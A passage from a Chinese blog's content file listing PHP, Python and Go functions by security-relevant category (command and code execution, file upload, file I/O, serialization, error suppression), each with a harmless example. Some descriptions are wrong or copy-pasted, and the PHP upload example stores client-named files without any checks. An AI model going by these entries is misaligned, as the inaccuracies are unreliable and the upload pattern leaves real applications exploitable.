class="hljs plaintext">system(&#x27;ls -l&#x27;);<br></code></pre></td></tr></table></figure><h2 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h2><p>用于执行外部程序，并将输出直接传递给标准输出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">passthru(&#x27;ls -l&#x27;);<br></code></pre></td></tr></table></figure><h2 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h2><p>用于执行外部程序，并创建一个管道连接到该程序的输入或输出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$handle = popen(&#x27;ls -l&#x27;, &#x27;r&#x27;);<br>while (!feof($handle)) &#123;<br>    echo fgets($handle);<br>&#125;<br>pclose($handle);<br></code></pre></td></tr></table></figure><h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p>用于解析并执行字符串中的 PHP 代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$code = &#x27;echo &quot;Hello, World!&quot;;&#x27;;<br>eval($code);<br></code></pre></td></tr></table></figure><h2 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h2><p>用于创建匿名函数并执行其中的代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$code = &#x27;$x = 5; assert($x &gt; 10);&#x27;;<br>assert($code);<br></code></pre></td></tr></table></figure><h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h2><p>用于创建匿名函数并执行其中的代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$code = &#x27;echo &quot;Hello, World!&quot;;&#x27;;<br>$func = create_function(&#x27;&#x27;, $code);<br>$func();<br></code></pre></td></tr></table></figure><h2 id="include-或-require"><a href="#include-或-require" class="headerlink" title="include() 或 require()"></a>include() 或 require()</h2><p>用于包含并执行指定文件中的 PHP 代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">include &#x27;myfile.php&#x27;;<br>require &#x27;anotherfile.php&#x27;;<br></code></pre></td></tr></table></figure><h2 id="include-once-或-require-once"><a href="#include-once-或-require-once" class="headerlink" title="include_once() 或 require_once()"></a>include_once() 或 require_once()</h2><p>用于包含并执行指定文件中的 PHP 代码，但只包含一次，防止重复包含。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">include_once &#x27;myfile.php&#x27;;<br>require_once &#x27;anotherfile.php&#x27;;<br></code></pre></td></tr></table></figure><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file()"></a>move_uploaded_file()</h2><p>将上传的文件移动到指定位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$file = $_FILES[&#x27;file&#x27;];  // 通过表单获取上传文件的信息<br>$targetDir = &#x27;uploads/&#x27;;  // 目标文件夹路径<br>$targetFile = $targetDir . basename($file[&#x27;name&#x27;]);  // 目标文件路径<br><br>if (move_uploaded_file($file[&#x27;tmp_name&#x27;], $targetFile)) &#123;<br>    echo &#x27;文件上传成功&#x27;;<br>&#125; else &#123;<br>    echo &#x27;文件上传失败&#x27;;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="upload-tmp-dir"><a href="#upload-tmp-dir" class="headerlink" title="upload_tmp_dir()"></a>upload_tmp_dir()</h2><p>用于设置上传文件的临时目录。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ini_set(&#x27;upload_tmp_dir&#x27;, &#x27;/tmp/uploads/&#x27;);  // 设置上传文件的临时目录<br></code></pre></td></tr></table></figure><h2 id="is-uploaded-file"><a href="#is-uploaded-file" class="headerlink" title="is_uploaded_file()"></a>is_uploaded_file()</h2><p>检查文件是否是通过 HTTP POST 上传的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$file = $_FILES[&#x27;file&#x27;];  // 通过表单获取上传文件的信息<br><br>if (is_uploaded_file($file[&#x27;tmp_name&#x27;])) &#123;<br>    echo &#x27;文件是通过上传方式获取的&#x27;;<br>&#125; else &#123;<br>    echo &#x27;文件不是通过上传方式获取的&#x27;;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h2><p>将整个文件读取为字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$fileContent = file_get_contents(&#x27;myfile.txt&#x27;);<br>echo $fileContent;<br></code></pre></td></tr></table></figure><h2 id="fread"><a href="#fread" class="headerlink" title="fread()"></a>fread()</h2><p>从打开的文件中读取指定长度的数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$file = fopen(&#x27;myfile.txt&#x27;, &#x27;r&#x27;);<br>$data = fread($file, 1024);<br>fclose($file);<br>echo $data;<br></code></pre></td></tr></table></figure><h2 id="fgets"><a href="#fgets" class="headerlink" title="fgets()"></a>fgets()</h2><p>从打开的文件中逐行读取数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$file = fopen(&#x27;myfile.txt&#x27;, &#x27;r&#x27;);<br>while ($line = fgets($file)) &#123;<br>    echo $line;<br>&#125;<br>fclose($file);<br></code></pre></td></tr></table></figure><h2 id="file"><a href="#file" class="headerlink" title="file()"></a>file()</h2><p>将文件的每一行读取到数组中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$lines = file(&#x27;myfile.txt&#x27;);<br>foreach ($lines as $line) &#123;<br>    echo $line;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h1><h2 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents()"></a>file_put_contents()</h2><p>将字符串内容写入文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$data = &quot;Hello, World!&quot;;<br>file_put_contents(&#x27;myfile.txt&#x27;, $data);<br></code></pre></td></tr></table></figure><h2 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite()"></a>fwrite()</h2><p>向打开的文件中写入数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$file = fopen(&#x27;myfile.txt&#x27;, &#x27;w&#x27;);<br>$data = &quot;Hello, World!&quot;;<br>fwrite($file, $data);<br>fclose($file);<br></code></pre></td></tr></table></figure><h2 id="file-1"><a href="#file-1" class="headerlink" title="file()"></a>file()</h2><p>将数组的每个元素写入文件的每一行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$data = array(&quot;Line 1&quot;, &quot;Line 2&quot;, &quot;Line 3&quot;);<br>file_put_contents(&#x27;myfile.txt&#x27;, implode(&quot;\n&quot;, $data));<br></code></pre></td></tr></table></figure><h2 id="fprintf"><a href="#fprintf" class="headerlink" title="fprintf()"></a>fprintf()</h2><p>将数组的每个元素写入文件的每一行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$file = fopen(&#x27;myfile.txt&#x27;, &#x27;w&#x27;);<br>$data = &quot;Hello, World!&quot;;<br>fprintf($file, &quot;Message: %s&quot;, $data);<br>fclose($file);<br></code></pre></td></tr></table></figure><h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><h2 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h2><p>将 PHP 值序列化为字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$data = array(&#x27;name&#x27; =&gt; &#x27;John&#x27;, &#x27;age&#x27; =&gt; 30);<br>$serializedData = serialize($data);<br>echo $serializedData;<br></code></pre></td></tr></table></figure><h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h2><p>将序列化的字符串转换回 PHP 值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$serializedData = &#x27;a:2:&#123;s:4:&quot;name&quot;;s:4:&quot;John&quot;;s:3:&quot;age&quot;;i:30;&#125;&#x27;;<br>$data = unserialize($serializedData);<br>print_r($data);<br></code></pre></td></tr></table></figure><h2 id="json-encode"><a href="#json-encode" class="headerlink" title="json_encode()"></a>json_encode()</h2><p>将 PHP 值转换为 JSON 字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$data = array(&#x27;name&#x27; =&gt; &#x27;John&#x27;, &#x27;age&#x27; =&gt; 30);<br>$jsonData = json_encode($data);<br>echo $jsonData;<br></code></pre></td></tr></table></figure><h2 id="json-decode"><a href="#json-decode" class="headerlink" title="json_decode()"></a>json_decode()</h2><p>将 JSON 字符串转换为 PHP 值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$jsonData = &#x27;&#123;&quot;name&quot;:&quot;John&quot;,&quot;age&quot;:30&#125;&#x27;;<br>$data = json_decode($jsonData, true);<br>print_r($data);<br></code></pre></td></tr></table></figure><h1 id="忽略报错"><a href="#忽略报错" class="headerlink" title="忽略报错"></a>忽略报错</h1><h2 id="error-reporting"><a href="#error-reporting" class="headerlink" title="error_reporting()"></a>error_reporting()</h2><p>设置报错级别。通过设置报错级别为 <code>0</code>，可以忽略所有报错信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">error_reporting(0);<br></code></pre></td></tr></table></figure><h2 id="ini-set"><a href="#ini-set" class="headerlink" title="ini_set()"></a>ini_set()</h2><p>设置 PHP 配置项。通过设置 <code>display_errors</code> 为 <code>off</code>，可以禁用报错信息的显示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ini_set(&#x27;display_errors&#x27;, &#x27;off&#x27;);<br></code></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title="@"></a>@</h2><p>将其放置在表达式前面，可以忽略该表达式的报错信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$result = @some_function(); // 忽略 some_function() 的报错信息<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 函数</title>
      <link href="/2023/06/18/%E8%AF%AD%E8%A8%80/Python/Python%E5%87%BD%E6%95%B0/"/>
      <url>/2023/06/18/%E8%AF%AD%E8%A8%80/Python/Python%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="os-system-command"><a href="#os-system-command" class="headerlink" title="os.system(command)"></a>os.system(command)</h2><p>在操作系统中执行命令，并返回执行结果的状态码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import os<br><br># 执行命令并打印结果<br>os.system(&quot;ls -l&quot;)<br></code></pre></td></tr></table></figure><h2 id="os-popen-command"><a href="#os-popen-command" class="headerlink" title="os.popen(command)"></a>os.popen(command)</h2><p>执行命令并返回一个文件对象，可以用于读取命令的输出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import os<br><br># 执行命令并读取输出<br>output = os.popen(&quot;ls -l&quot;).read()<br>print(output)<br></code></pre></td></tr></table></figure><h2 id="subprocess-call-args"><a href="#subprocess-call-args" class="headerlink" title="subprocess.call(args)"></a>subprocess.call(args)</h2><p>在新的子进程中执行命令，并等待命令完成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import subprocess<br><br># 执行命令并等待完成<br>subprocess.call([&quot;ls&quot;, &quot;-l&quot;])<br></code></pre></td></tr></table></figure><h2 id="subprocess-check-output-args"><a href="#subprocess-check-output-args" class="headerlink" title="subprocess.check_output(args)"></a>subprocess.check_output(args)</h2><p>在新的子进程中执行命令，并返回命令的输出结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import subprocess<br><br># 执行命令并获取输出<br>output = subprocess.check_output([&quot;ls&quot;, &quot;-l&quot;])<br>print(output)<br></code></pre></td></tr></table></figure><h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p>执行字符串中的 Python 表达式，并返回结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">x = 10<br>result = eval(&quot;x + 5&quot;)<br>print(result)  # 输出 15<br></code></pre></td></tr></table></figure><h2 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h2><p>执行字符串中的 Python 代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">code = &quot;&quot;&quot;<br>x = 10<br>print(&quot;The value of x is&quot;, x)<br>&quot;&quot;&quot;<br>exec(code)<br></code></pre></td></tr></table></figure><h2 id="compile"><a href="#compile" class="headerlink" title="compile()"></a>compile()</h2><p>将字符串编译为可执行的 Python 代码对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">code = &quot;&quot;&quot;<br>x = 10<br>print(&quot;The value of x is&quot;, x)<br>&quot;&quot;&quot;<br>compiled_code = compile(code, &#x27;&lt;string&gt;&#x27;, &#x27;exec&#x27;)<br>exec(compiled_code)<br></code></pre></td></tr></table></figure><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="Flask-框架"><a href="#Flask-框架" class="headerlink" title="Flask 框架"></a>Flask 框架</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from flask import Flask, request<br><br>app = Flask(__name__)<br><br>@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])<br>def upload_file():<br>    file = request.files[&#x27;file&#x27;]  # 通过表单获取上传文件的信息<br>    # 处理上传文件的逻辑<br>    return &#x27;文件上传成功&#x27;<br><br>if __name__ == &#x27;__main__&#x27;:<br>    app.run()<br></code></pre></td></tr></table></figure><h2 id="Django-框架"><a href="#Django-框架" class="headerlink" title="Django 框架"></a>Django 框架</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from django.http import HttpResponse<br><br>def upload_file(request):<br>    file = request.FILES[&#x27;file&#x27;]  # 通过表单获取上传文件的信息<br>    # 处理上传文件的逻辑<br>    return HttpResponse(&#x27;文件上传成功&#x27;)<br></code></pre></td></tr></table></figure><h2 id="Werkzeug-框架"><a href="#Werkzeug-框架" class="headerlink" title="Werkzeug 框架"></a>Werkzeug 框架</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from werkzeug.datastructures import FileStorage<br><br>def upload_file(file):<br>    if isinstance(file, FileStorage):<br>        # 处理上传文件的逻辑<br>        return &#x27;文件上传成功&#x27;<br>    else:<br>        return &#x27;无效的文件&#x27;<br><br># 调用示例<br>file = request.files.get(&#x27;file&#x27;)<br>result = upload_file(file)<br></code></pre></td></tr></table></figure><h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><h2 id="open"><a href="#open" class="headerlink" title="open()"></a>open()</h2><p>用于打开文件并返回文件对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">file = open(&#x27;example.txt&#x27;, &#x27;r&#x27;)<br>data = file.read()<br>file.close()<br>print(data)<br></code></pre></td></tr></table></figure><h2 id="read"><a href="#read" class="headerlink" title="read()"></a>read()</h2><p>用于从文件对象中读取数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">file = open(&#x27;example.txt&#x27;, &#x27;r&#x27;)<br>data = file.read()<br>file.close()<br>print(data)<br></code></pre></td></tr></table></figure><h2 id="readline"><a href="#readline" class="headerlink" title="readline()"></a>readline()</h2><p>用于从文件对象中逐行读取数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">file = open(&#x27;example.txt&#x27;, &#x27;r&#x27;)<br>line1 = file.readline()<br>line2 = file.readline()<br>file.close()<br>print(line1)<br>print(line2)<br></code></pre></td></tr></table></figure><h2 id="readlines"><a href="#readlines" class="headerlink" title="readlines()"></a>readlines()</h2><p>用于从文件对象中读取所有行并返回一个列表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">file = open(&#x27;example.txt&#x27;, &#x27;r&#x27;)<br>lines = file.readlines()<br>file.close()<br>print(lines)<br></code></pre></td></tr></table></figure><h1 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h1><h2 id="write"><a href="#write" class="headerlink" title="write()"></a>write()</h2><p>将指定内容写入文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">file = open(&quot;example.txt&quot;, &quot;w&quot;)<br>file.write(&quot;Hello, World!&quot;)<br>file.close()<br></code></pre></td></tr></table></figure><h2 id="writelines"><a href="#writelines" class="headerlink" title="writelines()"></a>writelines()</h2><p>将字符串列表逐行写入文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">lines = [&quot;Line 1\n&quot;, &quot;Line 2\n&quot;, &quot;Line 3\n&quot;]<br>file = open(&quot;example.txt&quot;, &quot;w&quot;)<br>file.writelines(lines)<br>file.close()<br></code></pre></td></tr></table></figure><h2 id="print"><a href="#print" class="headerlink" title="print()"></a>print()</h2><p>配合文件对象：将内容写入文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">file = open(&quot;example.txt&quot;, &quot;w&quot;)<br>print(&quot;Hello, World!&quot;, file=file)<br>file.close()<br></code></pre></td></tr></table></figure><h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><h2 id="pickle-dumps"><a href="#pickle-dumps" class="headerlink" title="pickle.dumps()"></a>pickle.dumps()</h2><p>将 Python 对象序列化为字节流。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import pickle<br><br>data = &#123;&#x27;name&#x27;: &#x27;John&#x27;, &#x27;age&#x27;: 30&#125;<br>serializedData = pickle.dumps(data)<br>print(serializedData)<br></code></pre></td></tr></table></figure><h2 id="pickle-loads"><a href="#pickle-loads" class="headerlink" title="pickle.loads()"></a>pickle.loads()</h2><p>将序列化的字节流反序列化为 Python 对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import pickle<br><br>serializedData = b&#x27;\x80\x04\x95\x1d\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x04name\x94\x8c\x04John\x94\x8c\x03age\x94K\x1e\x86\x94.&#x27;<br>data = pickle.loads(serializedData)<br>print(data)<br></code></pre></td></tr></table></figure><h2 id="json-dumps"><a href="#json-dumps" class="headerlink" title="json.dumps()"></a>json.dumps()</h2><p>将 Python 对象转换为 JSON 字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import json<br><br>data = &#123;&#x27;name&#x27;: &#x27;John&#x27;, &#x27;age&#x27;: 30&#125;<br>jsonData = json.dumps(data)<br>print(jsonData)<br></code></pre></td></tr></table></figure><h2 id="json-loads"><a href="#json-loads" class="headerlink" title="json.loads()"></a>json.loads()</h2><p>将 JSON 字符串转换为 Python 对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import json<br><br>jsonData = &#x27;&#123;&quot;name&quot;: &quot;John&quot;, &quot;age&quot;: 30&#125;&#x27;<br>data = json.loads(jsonData)<br>print(data)<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang 函数</title>
      <link href="/2023/06/18/%E8%AF%AD%E8%A8%80/Go/%E5%85%B6%E4%BB%96/Go%20%E5%87%BD%E6%95%B0/"/>
      <url>/2023/06/18/%E8%AF%AD%E8%A8%80/Go/%E5%85%B6%E4%BB%96/Go%20%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="Command"><a href="#Command" class="headerlink" title="Command"></a>Command</h2><p>创建一个执行给定命令的 <code>Cmd</code> 结构体。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>&quot;fmt&quot;<br>&quot;os/exec&quot;<br>)<br><br>func main() &#123;<br>// 创建一个命令对象<br>cmd := exec.Command(&quot;ls&quot;, &quot;-l&quot;)<br><br>// 执行命令并获取输出<br>output, err := cmd.Output()<br>if err != nil &#123;<br>fmt.Println(&quot;命令执行失败:&quot;, err)<br>return<br>&#125;<br><br>// 输出命令执行结果<br>fmt.Println(string(output))<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CombinedOutput"><a href="#CombinedOutput" class="headerlink" title="CombinedOutput"></a>CombinedOutput</h2><p>执行命令并返回标准输出和标准错误的合并结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>&quot;fmt&quot;<br>&quot;os/exec&quot;<br>)<br><br>func main() &#123;<br>cmd := exec.Command(&quot;ls&quot;, &quot;-l&quot;) // 创建命令对象<br>output, err := cmd.CombinedOutput() // 执行命令并获取合并的标准输出和标准错误输出<br>if err != nil &#123;<br>fmt.Println(&quot;命令执行失败：&quot;, err)<br>return<br>&#125;<br>fmt.Println(string(output)) // 打印命令输出结果<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>&quot;fmt&quot;<br>&quot;os/exec&quot;<br>)<br><br>func main() &#123;<br>cmd := exec.Command(&quot;ls&quot;, &quot;-l&quot;) // 创建命令对象<br>err := cmd.Start()              // 启动命令，不等待命令执行完成<br>if err != nil &#123;<br>fmt.Println(&quot;命令启动失败：&quot;, err)<br>return<br>&#125;<br>fmt.Println(&quot;命令已启动&quot;)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h2><p>执行命令并等待命令执行完毕。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 